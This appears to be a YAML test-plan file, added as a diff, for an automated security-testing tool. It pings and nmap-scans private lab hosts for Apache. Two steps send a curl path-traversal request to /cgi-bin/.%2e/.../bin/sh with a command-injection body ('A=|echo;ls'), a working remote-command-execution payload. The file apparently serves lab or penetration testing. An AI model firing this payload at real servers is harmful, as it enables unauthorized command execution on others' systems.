@@ -1,0 +1,42 @@
+actions:
+
+  test:
+    1:
+      call: testping
+      #expected: Success
+    2:
+      operator: AND
+      2a:
+        command: nmap -sV 192.168.2.10 | fgrep 'Apache' | awk '/open/'
+        expected: Apache
+      2b: [echo 'test kali', test kali]
+    3:
+      [curl 'http://192.168.2.10/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'A=|echo;ls', bash]
+    4:
+      command: echo 'OK'
+      expected: OK
+
+  testping:
+    1:
+      command: ping -c 3 <$IP:192.168.2.10>
+      expected: 3 received
+    2: 
+      command: echo 'test'
+      expected: test
+
+
+  test_plan:
+    1:
+      operator: AND
+      1a:
+        command: nmap -sV <$IP:192.168.3.10> | fgrep '<$TEST:Apache>' | awk '/open/'
+        expected: <$TEST:Apache>
+      1b: [echo 'test kali', test kali]
+    2:
+      [curl 'http://<$IP:192.168.3.10>/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'A=|echo;ls', bash]
+    3:
+      command: echo 'OK'
+      expected: OK
+
+
+
